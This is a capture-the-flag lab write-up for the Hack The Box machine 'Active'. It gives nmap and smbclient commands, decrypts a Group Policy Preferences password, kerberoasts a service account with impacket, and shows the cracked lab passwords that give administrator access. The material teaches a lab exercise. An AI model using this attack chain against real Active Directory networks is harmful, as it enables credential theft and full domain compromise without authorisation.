---
title: Active
layout: post
author: Bit Criminals Team
date: 2021-08-02 14:30:00 +0530
type: Pentesting
difficulty: Easy
prompt: https://app.hackthebox.eu/machine/Active
---

## STEP_1 ==> NMAP Scan

```bash
└─$ nmap -sV 10.10.10.100 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-02 14:41 IST
Nmap scan report for 10.10.10.100
Host is up (0.18s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-08-02 09:24:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.08 seconds
```

## STEP_2 ==> Enumeration

```bash
smbclient -L 10.10.10.100
```
![](HTB_Active/images/2.png)

  
## STEP_3 ==> Connect to the Replication

```bash
smbclient //10.10.10.100/Replication
```

We find that Groups.xml contains an encrypted password of username SVC_TGS.

![](HTB_Active/images/3.png) 


## STEP_4 ==> Cracking the encryption

The private key was released by Microsoft so it can be decrypted from the built in kali tool `/usr/bin/gpp-decrypt`

![](HTB_Active/images/pass_crack.png)

```Password-GPPstillStandingStrong2k18```


 ## STEP_5 ==> Getting User.txt

From above credential we login as user - SVC_TGS
```bash
smbclient //10.10.10.100/Users -U SVC_TGS
```

![](HTB_Active/images/user.png)


## STEP_6 ==> Privilege Escalation

In nmap scanning result we saw port 88 was open for Kerberos therfore some SPN is associated.

>https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py

![](HTB_Active/images/5.png)


## STEP_7 ==> Cracking the hash

![](HTB_Active/images/6.png)
```Password-Ticketmaster1968```

## STEP_8 ==> Login as administrator

```bash
smbclient //10.10.10.100/C$ -U active.htb\\administrator
```

![](HTB_Active/images/7.png)


## STEP_9 ==> root.txt

` /Users/Administrator/Desktop`
  
![](HTB_Active/images/8.png)

![](HTB_Active/images/root.png)
